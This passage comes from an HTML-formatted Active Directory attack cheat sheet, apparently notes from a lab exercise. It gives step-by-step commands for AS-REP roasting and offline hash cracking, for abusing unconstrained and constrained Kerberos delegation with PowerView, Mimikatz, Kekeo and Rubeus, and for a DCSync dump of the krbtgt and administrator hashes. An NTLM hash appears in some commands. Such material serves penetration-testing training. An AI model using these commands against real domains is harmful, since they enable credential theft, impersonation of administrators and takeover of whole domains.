&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">DoesNotRequirePreAuth&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">DoesNotRequirePreAuth&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or letâs enumerate the permissions for &lt;em>RDPUsers&lt;/em> on ACLs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;RDPUsers&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Users in &lt;em>RDPUser&lt;/em> group have &lt;em>GenericWrite&lt;/em> or &lt;em>GenericAll&lt;/em> permission on &lt;em>STUDENTI1&lt;/em> user so it is possible to force the disable of Kerberos Preauth on it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-XOR&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">useraccountcontrol&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">4194304&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-VerboseGet-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request encrypted AS-REP for offline brute-force&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ASREPRoast&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ASREPHash&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ASREPHash&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$23$&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is also possible to enumerate all users with Kerberos preauth disabled and request a hash:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ASREPRoast&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ASREPRoast&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ASREPRoast&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$23$&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using bleeding-jumbo branch of John The Ripper or HashCat, we can brute-force the hashes offline:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5asrep --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt john_asrep.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">18200&lt;/span> --force hashcat_asrep.kirbi ./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="unconstrained-delegation">Unconstrained Delegation&lt;/h2>
&lt;p>General/Basic or Unconstrained Delegation which allows the first hop server (e.g.Â web server) to request access to any service on any computer in the domain.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Discover domain computers which have unconstrained delegation enabled:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-UnConstrained&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">TrustedForDelegation&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">TrustedForDelegation&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Compromise the server(s) where Unconstrained delegation is enabled and trick or wait for a domain admin to connect to the service. We can use the following PowerView command to notify for a particular DA to access a resource on the web server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;ops-web&amp;#34;&lt;/span> &lt;span class="n">-Poll&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-Delay&lt;/span> &lt;span class="mf">5&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Run following commands on it to check if any DA ticket is available and then export it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets&amp;#34;&amp;#39;&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The DA ticket could then be reused:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-060a10000-Administrator@krbtgtCYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="constrained-delegation">Constrained Delegation&lt;/h2>
&lt;p>Constrained Delegation allows the first hop server (e.g web server) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers &lt;em>Protocol Transition&lt;/em> to transition the request to Kerberos.&lt;/p>
&lt;p>To impersonate the user, &lt;strong>Service for User&lt;/strong> (&lt;strong>S4U&lt;/strong>) extension is used and it provides two extensions:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Service for User to Self&lt;/strong> (&lt;strong>S4U2self&lt;/strong>): Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the &lt;em>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION&lt;/em> - T2A4D UserAccountControl attribute.&lt;/li>
&lt;li>&lt;strong>Service for User to Proxy&lt;/strong> (&lt;strong>S4U2proxy&lt;/strong>): Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by &lt;em>msDS-AllowedToDelegateTo&lt;/em> attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.&lt;/li>
&lt;/ul>
&lt;p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, itâs possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.&lt;/p>
&lt;p>Enumerate users and computers with constrained delegation enabled:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainComputer&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADObject&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">msDS-AllowedToDelegateTo&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="nb">msDS-AllowedToDelegateTo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="constrained-delegation-allowed-for-a-user-account">Constrained delegation allowed for a User Account&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>To abuse constrained delegation in above scenario, we need to have access to the account for which the constrained delegation is enabled. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of this account as ANY user.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Using &lt;em>asktgt&lt;/em> from Kekeo, we request a TGT as the abused account. Either plaintext password or NTLM hash of the compromised account (with constrained delegation enabled) is required:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgt::ask /user:WEBSVC /domain:cyberlab.cybercorp.local /rc4:[NTLM_HASH_USER_ENABLED_DELEGATION]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using s4u from Kekeo, we request a TGS as ANY user for the service to which the delegation is enabled, e.g.Â &lt;em>FILESERVER&lt;/em>, using the TGT previously obtained:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:[TGT_USER_ENABLED_DELEGATION] /user:Administrator@CYBERLAB.CYBERCORP.LOCAL /service:cifs/FILESERVER.CYBERLAB.CYBERCORP.LOCAL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using mimikatz, inject the TGS ticket:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~FILESERVER.CYBERLAB.CYBERCORP.LOCAL@CYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Access the file shares of the target:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="n">fileserver&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="constrained-delegation-allowed-for-a-machine-account">Constrained delegation allowed for a Machine Account&lt;/h2>
&lt;p>If you have compromised a machine account or in other words you have SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>List services to which the machine account is trusted to delegate to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">msds-allowedtodelegateto&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">useraccountcontrol&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select-Object&lt;/span> &lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="nb">msds-allowedtodelegateto&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using asktgt from Kekeo, we request a TGT as the abused account (in this case a machine account):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgt::ask /user:cyberlab-adminsrv$ /domain:CYBERLAB.CYBERCORP.LOCAL /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using s4u from Kekeo (no SNAME validation) it is possible to ask for a TGS also for &lt;em>time&lt;/em> and &lt;em>ldap&lt;/em> services by running other two separate commands (putting both the base service and a single alternative one):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp..local /service:cifs/fileserver.cyberlab.cybercorp.local|time/fileserver.cyberlab.cybercorp.local
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local|ldap/fileserver.cyberlab.cybercorp.local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using mimikatz it is possible to inject all the generated TGS tickets (from the previous commands) into the session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_time~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ldap~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>If we have a ticket for the LDAP service it is possible to perform a DCSync:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\administrator&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>The same procedure can also be performed by using &lt;code>Rubeus&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Using asktgt from Rubeus, we request a TGT as the abused account (in this case a machine account):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Rubeus&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">cyberlab-adminsrv&lt;/span>&lt;span class="p">$&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CYBERLAB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">CYBERCORP&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LOCAL&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">rc4&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">1fadb1b13edbc5a61cbdc389e6f34c67&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">outfile&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">deleg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using s4u from Rubeus (no SNAME validation) it is possible to ask for a TGS also for &lt;em>time&lt;/em> and &lt;em>ldap&lt;/em> services (remember to include in the &lt;em>altservice&lt;/em> field also the first service):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Rubeus&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">s4u&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">deleg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">impersonateuser&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">administrator&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">msdsspn&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cifs&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">altservice&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cifs&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ldap&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">wsman&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">rpcss&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>An alternative in case of SYSTEM level compromise of a machine with constrained delegation enabled:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Impersonate the Administrator account:&lt;/p>
